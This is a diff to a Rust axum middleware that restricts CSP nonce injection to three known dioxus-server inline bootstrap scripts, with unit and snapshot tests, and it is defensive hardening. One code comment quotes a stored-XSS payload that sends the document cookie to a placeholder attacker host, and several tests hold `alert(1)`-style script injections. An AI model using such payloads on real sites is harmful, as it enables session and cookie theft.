@@ -17,23 +17,27 @@
 //!
 //! ## What gets rewritten
 //!
-//! Only the literal byte sequence `<script>` (open tag with no attributes)
-//! is replaced with `<script nonce="…">`. External scripts in the dx-CLI
-//! prod bundle use `<script type="module" async src="…"></script>` and
-//! stay covered by `script-src 'self'` — the trailing `>` ensures we
-//! don't touch them. The dev-mode toast template's inline `<script>` is
-//! also rewritten, which is correct.
+//! A literal `<script>` open tag (no attributes) is replaced with
+//! `<script nonce="…">` **only when the bytes immediately following the
+//! tag start with one of [`KNOWN_INLINE_SCRIPT_PREFIXES`]** — the three
+//! shapes dx-server 0.7.7 actually emits. Any other inline `<script>` is
+//! left untouched and therefore blocked by the per-request CSP nonce.
+//! External scripts in the dx-CLI prod bundle use
+//! `<script type="module" async src="…"></script>` and stay covered by
+//! `script-src 'self'` — the trailing `>` ensures we don't touch them.
 //!
-//! ## What this does NOT protect against
+//! ## Defense-in-depth posture (PURA-53)
 //!
-//! If a future code path emits user-supplied HTML containing the literal
-//! substring `<script>` (eg. unescaped channel descriptions or welcome
-//! messages), the rewriter will nonce that script too — letting it
-//! execute despite the CSP. Phase 1 has no such surface; any new surface
-//! MUST HTML-escape `<` to `&lt;` before reaching the SSR pipeline. This
-//! is the standard rule for nonce-based CSP, but it is load-bearing and
-//! worth the sign-off from SecurityEngineer before any user-controlled
-//! HTML lands.
+//! Earlier the rewriter nonced every literal `<script>`. That made the
+//! "HTML-escape user input before SSR" rule load-bearing — a single
+//! future surface (eg. rich channel descriptions, welcome messages, bot
+//! templates) forgetting to escape `<` would let a stored
+//! `<script>fetch('//attacker/'+document.cookie)</script>` execute under
+//! our nonce, with same-origin access to `/api/*` and the auth cookie.
+//!
+//! The prefix-allowlist refuses to nonce anything that doesn't look like
+//! a dx-emitted bootstrap script. The HTML-escape rule still applies as
+//! defense-in-depth, but a single missed escape no longer collapses CSP.
 //!
 //! ## Buffering vs streaming
 //!
@@ -104,6 +108,33 @@ fn make_nonce() -> String {
 /// 4 MiB is generous; if a route ever blows through it we want to know.
 const MAX_HTML_SIZE: usize = 4 * 1024 * 1024;
 
+/// Body-prefix allowlist: the rewriter only nonces a `<script>` open tag
+/// when the bytes that follow it start with one of these prefixes.
+///
+/// Pinned verbatim to dioxus-server 0.7.7's three SSR emit sites (a
+/// follow-up snapshot test imports this constant so any version bump
+/// that drifts the emit shape fails CI):
+///
+/// - `dioxus-server-0.7.7/src/ssr.rs:717`
+///   `write!(to, "<script>{INITIALIZE_STREAMING_JS}</script>")` where
+///   `INITIALIZE_STREAMING_JS` is
+///   `dioxus-interpreter-js-0.7.7/src/js/initialize_streaming.js`,
+///   which begins with `window.hydrate_queue=[];`.
+/// - `dioxus-server-0.7.7/src/ssr.rs:736`
+///   `r#"<script>window.initial_dioxus_hydration_data="{raw_data}";"#`.
+/// - `dioxus-server-0.7.7/src/streaming.rs:131`
+///   `r#"</div><script>window.dx_hydrate([{id}], "{}""#`.
+///
+/// These prefixes are intentionally fingerprint-shaped, not minimal: an
+/// attacker who lands literal `<script>` in user-controlled HTML would
+/// have to also reproduce the prefix bytes to slip past CSP, which is
+/// strictly harder than just emitting a `<script>` tag.
+pub const KNOWN_INLINE_SCRIPT_PREFIXES: &[&[u8]] = &[
+    b"window.hydrate_queue=[];",
+    b"window.initial_dioxus_hydration_data=\"",
+    b"window.dx_hydrate(",
+];
+
 /// axum middleware: generates the nonce, rewrites HTML, sets CSP.
 pub async fn nonce_csp_middleware(mut req: Request, next: Next) -> Response {
     let nonce = make_nonce();
@@ -149,11 +180,15 @@ fn response_is_html(resp: &Response) -> bool {
         .unwrap_or(false)
 }
 
-/// Replace every literal `<script>` (the open tag with no attributes) with
-/// `<script nonce="{nonce}">`. Byte-level so we don't need a UTF-8 round
-/// trip and chunk boundaries can't produce invalid str slices. Operates on
-/// the fully buffered body so we don't have to worry about needle splits
-/// across boundaries.
+/// Replace `<script>` (the open tag with no attributes) with
+/// `<script nonce="{nonce}">` **only when** the bytes following the tag
+/// match one of [`KNOWN_INLINE_SCRIPT_PREFIXES`]. Anything else — including
+/// arbitrary attacker-emitted `<script>alert(1)</script>` — is left
+/// unchanged and therefore blocked by the CSP nonce policy.
+///
+/// Byte-level so we don't need a UTF-8 round trip and chunk boundaries
+/// can't produce invalid str slices. Operates on the fully buffered body
+/// so we don't have to worry about needle splits across boundaries.
 fn rewrite_inline_scripts(body: &[u8], nonce: &str) -> Vec<u8> {
     const NEEDLE: &[u8] = b"<script>";
     let replacement = format!("<script nonce=\"{nonce}\">");
@@ -162,7 +197,9 @@ fn rewrite_inline_scripts(body: &[u8], nonce: &str) -> Vec<u8> {
     let mut out = Vec::with_capacity(body.len() + 32);
     let mut i = 0;
     while i + NEEDLE.len() <= body.len() {
-        if &body[i..i + NEEDLE.len()] == NEEDLE {
+        if &body[i..i + NEEDLE.len()] == NEEDLE
+            && script_body_is_dx_emitted(&body[i + NEEDLE.len()..])
+        {
             out.extend_from_slice(replacement);
             i += NEEDLE.len();
         } else {
@@ -172,6 +209,15 @@ fn rewrite_inline_scripts(body: &[u8], nonce: &str) -> Vec<u8> {
     }
     out.extend_from_slice(&body[i..]);
     out
+}
+
+/// True iff `script_body` starts with one of the dx-server 0.7.7 inline
+/// script prefixes. Defense-in-depth gate for the rewriter — see
+/// [`KNOWN_INLINE_SCRIPT_PREFIXES`].
+fn script_body_is_dx_emitted(script_body: &[u8]) -> bool {
+    KNOWN_INLINE_SCRIPT_PREFIXES
+        .iter()
+        .any(|prefix| script_body.starts_with(prefix))
 }
 
 #[cfg(test)]
@@ -375,18 +421,325 @@ mod tests {
         );
     }
 
+    /// PURA-53 acceptance #1: an attacker-controlled `<script>alert(1)`
+    /// that survives un-escaped to the SSR pipeline must NOT pick up a
+    /// nonce and therefore must be blocked by CSP.
     #[test]
-    fn rewrite_handles_overlapping_and_trailing_partial_needles() {
-        // Tag at end-of-buffer (no trailing bytes).
-        let out = rewrite_inline_scripts(b"hi <script>", "abc");
-        assert_eq!(out, br#"hi <script nonce="abc">"#);
+    fn rewrite_refuses_to_nonce_attacker_controlled_scripts() {
+        // The classic stored-XSS payload shape.
+        let evil = b"<!doctype html><body><script>alert(1)</script></body>";
+        let out = rewrite_inline_scripts(evil, "deadbeef");
+        assert_eq!(
+            out,
+            evil.to_vec(),
+            "PURA-53: <script>alert(1)</script> must come out unchanged (no nonce)"
+        );
 
-        // Multiple tags, mixed with content that contains `<` but not `<script>`.
-        let out = rewrite_inline_scripts(b"a<scrip<script>b<script>c", "x");
-        assert_eq!(out, br#"a<scrip<script nonce="x">b<script nonce="x">c"#);
+        // A close-but-no-cigar payload that mimics the `window.` shape but
+        // doesn't match any known prefix.
+        let near_miss = b"<script>window.evil=1;</script>";
+        let out = rewrite_inline_scripts(near_miss, "x");
+        assert_eq!(
+            out,
+            near_miss.to_vec(),
+            "PURA-53: <script> bodies that don't start with a known dx prefix must NOT be nonced"
+        );
 
-        // No tags at all.
+        // Empty-body `<script></script>` is also not a dx emit shape.
+        let empty = b"<script></script>";
+        let out = rewrite_inline_scripts(empty, "x");
+        assert_eq!(out, empty.to_vec());
+    }
+
+    /// PURA-53 acceptance #2: each of the three exact dx-server 0.7.7
+    /// emit shapes IS nonced.
+    #[test]
+    fn rewrite_nonces_each_known_dx_prefix() {
+        // 1) ssr.rs:717 — `<script>{INITIALIZE_STREAMING_JS}</script>`,
+        //    JS body begins with `window.hydrate_queue=[];`.
+        let body = b"<script>window.hydrate_queue=[];window.dx_hydrate=(id)=>{}</script>";
+        let out = rewrite_inline_scripts(body, "n1");
+        assert_eq!(
+            out,
+            br#"<script nonce="n1">window.hydrate_queue=[];window.dx_hydrate=(id)=>{}</script>"#
+                .to_vec(),
+            "INITIALIZE_STREAMING_JS bootstrap must be nonced"
+        );
+
+        // 2) ssr.rs:736 — `<script>window.initial_dioxus_hydration_data="…";"`.
+        let body = br#"<script>window.initial_dioxus_hydration_data="abc";</script>"#;
+        let out = rewrite_inline_scripts(body, "n2");
+        assert_eq!(
+            out,
+            br#"<script nonce="n2">window.initial_dioxus_hydration_data="abc";</script>"#.to_vec(),
+            "render_after_main hydration data script must be nonced"
+        );
+
+        // 3) streaming.rs:131 — `<script>window.dx_hydrate([id], "…"`.
+        let body = br#"<script>window.dx_hydrate([0], "def")</script>"#;
+        let out = rewrite_inline_scripts(body, "n3");
+        assert_eq!(
+            out,
+            br#"<script nonce="n3">window.dx_hydrate([0], "def")</script>"#.to_vec(),
+            "replace_placeholder dx_hydrate script must be nonced"
+        );
+    }
+
+    /// Each prefix in the allowlist must, when used as a script body, be
+    /// nonced. Catches drift between the constant and its citations
+    /// without depending on free-form bodies.
+    #[test]
+    fn every_known_prefix_satisfies_the_gate() {
+        for prefix in KNOWN_INLINE_SCRIPT_PREFIXES {
+            assert!(
+                script_body_is_dx_emitted(prefix),
+                "KNOWN_INLINE_SCRIPT_PREFIXES entry {:?} must satisfy the gate",
+                std::str::from_utf8(prefix).unwrap_or("<non-utf8>")
+            );
+        }
+    }
+
+    /// Mixed-content sanity: a single buffer with an attacker tag, a
+    /// known dx tag, and an external `src=` tag must rewrite only the
+    /// dx tag, leave the others byte-identical.
+    #[test]
+    fn rewrite_handles_mixed_content() {
+        let body = br#"<script>alert(1)</script><script>window.dx_hydrate([0], "x")</script><script type="module" src="/main.js"></script>"#;
+        let out = rewrite_inline_scripts(body, "x");
+        assert_eq!(
+            out,
+            br#"<script>alert(1)</script><script nonce="x">window.dx_hydrate([0], "x")</script><script type="module" src="/main.js"></script>"#.to_vec(),
+        );
+    }
+
+    /// No-tag and partial-tag inputs are still copied verbatim.
+    #[test]
+    fn rewrite_passes_through_when_no_full_needle() {
         let out = rewrite_inline_scripts(b"plain text", "x");
         assert_eq!(out, b"plain text");
+
+        // A truncated `<scrip` at end-of-buffer must not panic.
+        let out = rewrite_inline_scripts(b"prefix<scrip", "x");
+        assert_eq!(out, b"prefix<scrip");
+    }
+
+    // PURA-55 — snapshot test against real dioxus-server SSR output.
+    //
+    // The fixtures above are hand-rolled — they assert that the rewriter
+    // does the right thing **given the inline-script shapes we expect dx
+    // to emit**. They cannot catch the failure mode where a future
+    // `dioxus-server` bump changes those emit sites (eg. swaps to
+    // `<script type="module">`, adds `defer`, drops one of the prefix
+    // strings, or introduces a fourth shape). In that scenario the
+    // hand-rolled tests still pass, the rewriter silently misses the new
+    // shape, CSP blocks the un-nonced script, and the SPA renders blank
+    // in production.
+    //
+    // This test boots a minimal `dioxus_server::serve_dioxus_application`
+    // with a trivial component and `IndexHtml::ssr_only()`, layers it
+    // with `nonce_csp_middleware`, drives one GET request through the
+    // stack, and asserts on the **actual** rendered bytes:
+    //
+    // - Every `<script` opening in the body is either external (carries
+    //   `src=`) **or** carries `nonce="…"` matching the CSP nonce.
+    // - Every inline `<script>` body starts with one of
+    //   [`KNOWN_INLINE_SCRIPT_PREFIXES`].
+    //
+    // A dx version bump that drifts the emit shape now fails CI rather
+    // than silently breaking hydration in browsers.
+    mod dx_ssr_snapshot {
+        use super::super::*;
+        use axum::Router;
+        use axum::body::Body;
+        use axum::http::{Request as HttpRequest, StatusCode, header};
+        use axum::middleware::from_fn;
+        use dioxus::prelude::*;
+        use dioxus_server::{DioxusRouterExt, ServeConfig};
+        use http_body_util::BodyExt;
+        use tower::ServiceExt;
+
+        /// Trivial root component. We deliberately avoid any
+        /// `use_server_future` so the render path stays in
+        /// `StreamingMode::Disabled` — the production code path for
+        /// every PURA-5 page in Phase 1.
+        #[allow(non_snake_case)]
+        fn Trivial() -> Element {
+            rsx! {
+                div { "hello world" }
+            }
+        }
+
+        /// Drive one GET through `serve_api_application` + the nonce
+        /// middleware and return `(csp_header, rewritten_body_bytes)`.
+        ///
+        /// We use `serve_api_application` rather than
+        /// `serve_dioxus_application` because the latter calls
+        /// `serve_static_assets`, which panics if the
+        /// `<exe-dir>/public` directory does not exist (the case under
+        /// `cargo test` when no dx bundle has been copied). The two
+        /// helpers wire the same SSR `render_handler` — the inline
+        /// `<script>` tags we are testing come from the renderer, not
+        /// from the static-asset router.
+        ///
+        /// Likewise we point `DIOXUS_PUBLIC_PATH` at a non-existent
+        /// location so `ServeConfig::new()` falls back to its built-in
+        /// SSR-only `index.html`. Without this the test could pick up a
+        /// stale `target/debug/deps/public/index.html` from a previous
+        /// `dx build` and our assertions would depend on whatever inline
+        /// scripts that bundle happens to carry.
+        async fn render_through_nonce_middleware() -> (String, Vec<u8>) {
+            // SAFETY: env mutation is process-global. No other test in
+            // this module reads DIOXUS_PUBLIC_PATH, and ServeConfig::new
+            // only consults it during construction (below) — so the brief
+            // window during which it's set cannot influence parallel
+            // tests that don't touch dioxus-server.
+            unsafe {
+                std::env::set_var("DIOXUS_PUBLIC_PATH", "/nonexistent-pura55-public");
+            }
+            let serve_cfg = ServeConfig::new();
+            let router: Router = Router::new()
+                .serve_api_application(serve_cfg, Trivial)
+                .layer(from_fn(nonce_csp_middleware));
+
+            let req = HttpRequest::builder()
+                .uri("/")
+                .body(Body::empty())
+                .unwrap();
+            let resp = router.oneshot(req).await.expect("dx render must not error");
+            assert_eq!(resp.status(), StatusCode::OK, "dx render must return 200");
+
+            let csp = resp
+                .headers()
+                .get(header::CONTENT_SECURITY_POLICY)
+                .and_then(|v| v.to_str().ok())
+                .expect("nonce middleware must set CSP")
+                .to_owned();
+
+            let body = resp
+                .into_body()
+                .collect()
+                .await
+                .expect("body must drain")
+                .to_bytes()
+                .to_vec();
+            (csp, body)
+        }
+
+        /// Walk every `<script` opening tag in `body`. For each, return
+        /// `(opening_tag, inline_body_or_empty)`. External `src=` tags
+        /// have an empty inline body. A missing `</script>` close panics
+        /// — we want loud failures on malformed output.
+        fn iter_script_tags(body: &str) -> Vec<(String, String)> {
+            let mut out = Vec::new();
+            let mut idx = 0;
+            while let Some(rel) = body[idx..].find("<script") {
+                let abs = idx + rel;
+                let tag_end_rel = body[abs..]
+                    .find('>')
+                    .expect("malformed <script: missing closing >");
+                let tag_end = abs + tag_end_rel;
+                let opening = body[abs..=tag_end].to_string();
+
+                // Self-closing case `<script .../>` is not an HTML5 thing
+                // for the script element (browsers ignore it), but be safe.
+                let inline_body = if opening.ends_with("/>") {
+                    String::new()
+                } else if opening.contains(" src=") || opening.contains("\tsrc=") {
+                    // External script: skip to the first `</script>` so we
+                    // don't trip on the empty body.
+                    String::new()
+                } else {
+                    let body_start = tag_end + 1;
+                    let close_rel = body[body_start..]
+                        .find("</script>")
+                        .expect("malformed <script: missing </script>");
+                    body[body_start..body_start + close_rel].to_string()
+                };
+
+                // Always advance past `</script>` (or end of opening for
+                // self-close) so we don't re-find the same tag.
+                let after_close = body[tag_end..]
+                    .find("</script>")
+                    .map(|r| tag_end + r + "</script>".len())
+                    .unwrap_or(tag_end + 1);
+                idx = after_close;
+
+                out.push((opening, inline_body));
+            }
+            out
+        }
+
+        #[tokio::test]
+        async fn real_dx_ssr_inline_scripts_all_carry_nonce_and_known_prefix() {
+            let (csp, body_bytes) = render_through_nonce_middleware().await;
+            let body = String::from_utf8(body_bytes).expect("dx output must be UTF-8");
+
+            // Pull the per-request nonce out of the CSP header so we can
+            // assert that each inline script carries the *same* token.
+            let nonce_needle = "'nonce-";
+            let start = csp
+                .find(nonce_needle)
+                .expect("CSP must contain a nonce")
+                + nonce_needle.len();
+            let end = csp[start..]
+                .find('\'')
+                .expect("CSP nonce must be quote-terminated")
+                + start;
+            let nonce = &csp[start..end];
+            assert_eq!(nonce.len(), 32, "expected 128-bit hex nonce, got {nonce:?}");
+            let expected_attr = format!(r#"nonce="{nonce}""#);
+
+            // Sanity: the dx render must actually have produced inline
+            // scripts. If dx ever stops emitting any inline script (eg.
+            // moves to an external bootstrap), this guard fires and we
+            // re-evaluate the rewriter strategy explicitly rather than
+            // silently passing a vacuous test.
+            let scripts = iter_script_tags(&body);
+            let inline_count = scripts.iter().filter(|(_, b)| !b.is_empty()).count();
+            assert!(
+                inline_count >= 1,
+                "expected at least one inline <script> in dx SSR output. \
+                 dx may have changed its bootstrap strategy. Body: {body}"
+            );
+
+            for (opening, inline) in &scripts {
+                if inline.is_empty() {
+                    // External or self-closing: must NOT have been touched
+                    // (we only nonce inline tags); skip.
+                    continue;
+                }
+
+                // (1) Every inline <script> must carry the per-request
+                // nonce. If the rewriter regresses to miss any inline
+                // shape dx emits, this assertion fires.
+                assert!(
+                    opening.contains(&expected_attr),
+                    "PURA-55: inline <script> emitted by dx-server must carry nonce. \
+                     Tag: {opening:?}\nExpected nonce attr: {expected_attr}\nFull body: {body}"
+                );
+
+                // (2) Every inline <script> body must start with one of
+                // the known dx-server emit prefixes. If a dx version bump
+                // introduces a fourth shape, this assertion fires —
+                // forcing us to extend the allowlist consciously rather
+                // than discover the gap when the SPA renders blank.
+                assert!(
+                    KNOWN_INLINE_SCRIPT_PREFIXES
+                        .iter()
+                        .any(|p| inline.as_bytes().starts_with(p)),
+                    "PURA-55: inline <script> body does not match any \
+                     KNOWN_INLINE_SCRIPT_PREFIXES entry. dx-server may have \
+                     changed its emit shape. Update the allowlist (and \
+                     audit the new prefix for XSS gadgets) before merging.\n\
+                     Body prefix (first 200 bytes): {prefix:?}\n\
+                     Allowed prefixes: {allowed:?}",
+                    prefix = &inline.as_bytes()[..inline.len().min(200)],
+                    allowed = KNOWN_INLINE_SCRIPT_PREFIXES
+                        .iter()
+                        .map(|p| std::str::from_utf8(p).unwrap_or("<non-utf8>"))
+                        .collect::<Vec<_>>(),
+                );
+            }
+        }
     }
 }
